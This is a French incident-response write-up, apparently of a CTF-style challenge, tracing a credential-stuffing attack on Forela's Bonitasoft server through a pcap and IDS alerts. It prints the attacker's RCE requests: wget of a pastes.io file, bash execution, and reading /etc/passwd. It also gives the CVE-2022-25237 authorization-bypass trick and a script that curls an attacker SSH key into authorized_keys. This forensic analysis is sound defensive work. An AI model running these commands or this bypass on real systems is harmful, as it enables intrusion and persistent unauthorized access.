L'entreprise faisant appel à nous s'appelle Forela
Le fichier zip fournit contient un fichier pcap et un fichier d'alertes en JSON.

# Wireshark
On commence par ouvrir le pcap dans Wireshark.
On remarque que :
- La machine 172.31.6.44 est toujours présentes dans les paquets interceptés et communique avec beaucoup d'autres machines
- Les 2000 premiers paquet correspondent surement à un scan réseau avec des duo de paquets TCP pour établir la connexion puis la reset

## Requêtes HTTP
- Une requête est faite sur la machine 172.31.6.44 à l'url http://forela.co.uk:8080/bonita
- En se concentrant sur les requêtes HTTP, on observe de nombreuses requêtes sur l'url /bonita/loginservice avec des tentatives de connexions échouées. Ces connexions se font en utilisant des adresses email des salariés de Forela et des mots de passe différent pour chaque connexion
  -> l'attaquant a certainement récupérer des identifiants et mot de passe des salariés ailleurs et réalise une attaque **Credential stuffing** en les réutilisant sur cette application.
- L'attaquant finit par trouver des identifiants valides et se connecte en tant que seb.broom@forela.co.uk:g0vernm3nt
- Ensuite, il fait une upload le fichier `rce_api_extension.zip` sur le serveur avec l'url /bonita/api/pageUpload, puis il fait la requête : http://forela.co.uk:8080/bonita/API/extension/rce?p=0&c=1&cmd=whoami, ce qui laisse penser que l'attaquant à trouver une RCE
- Il continue avec : http://forela.co.uk:8080/bonita/API/extension/rce?p=0&c=1&cmd=cat%20/etc/passwd
  -> récupération du contenu du fichier /etc/passwd
- Puis : http://forela.co.uk:8080/bonita/API/extension/rce?p=0&c=1&cmd=wget%20https://pastes.io/raw/bx5gcr0et8
  -> il télécharge quelque chose sur le serveur avec wget
  - Puis : http://forela.co.uk:8080/bonita/API/extension/rce?p=0&c=1&cmd=bash%20bx5gcr0et8
  -> il exécute ce qu'il vient de télécharger avec bash

L'IP de l'attaquant est le 156.146.62.213, puis 138.199.59.221.

# Analyse fichier alerts.json
En ce concentrant sur l'adresse ip 138.199.9.221 comme ip source, on identifie 36 alertes, dont plusieurs exploitent apparemment la CVE-2022-25237 : `Bonitasoft Authorization Bypass and RCE`.

En faisant de même avec l'ip 156.146.62.213, on remarque un grand nombre d'alerte : `Bonitasoft Default User Login Attempt`. C'est donc depuis cet IP que l'attaquant a fait le brute force pour récupérer un compte avant de venir l'exploiter dans un second temps depuis l'IP 138.199.9.221.

## CVE-2022-25237
Cette CVE permet suppose d'avoir un accès utilisateur non privilégié sur l'application.
Ensuite, elle permet de contourner le mécanisme d'autorisation et ainsi d'utiliser des routes privilégié depuis le compte non privilégié.
Pour cela, il faut ajouter la chaine `;i18ntranslation` à la fin de certaines URL.


# Persistence
Avec les analyses précédentes, on a compris que l'attaquant à télécharger un fichier présent sur le site pastes.io, puis qu'il a exécuté ce fichier, certainement pour récupérer un reverse shell sur la machine.

Avec le wireshark, on identifie que le fichier a été récupéré à l'url : https://pastes.io/raw/bx5gcr0et8
On se connecte sur cet url et on trouve le fichier : 
```bash
#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart
```
On comprend alors que l'attaquant a ajouter sa clé SSH aux clés autorisées pour ensuite se connecter en SSH sur le serveur.

## IoC
On calcule le hash MD5 du fichier précédent et de la clé SSH de l'attaquant avec le site : https://www.md5hashgenerator.com/.

On peut aussi ajouter que la technique utilisée pour la persistence correspond à l'ID T1098.004 du MITTRE ATT&CK.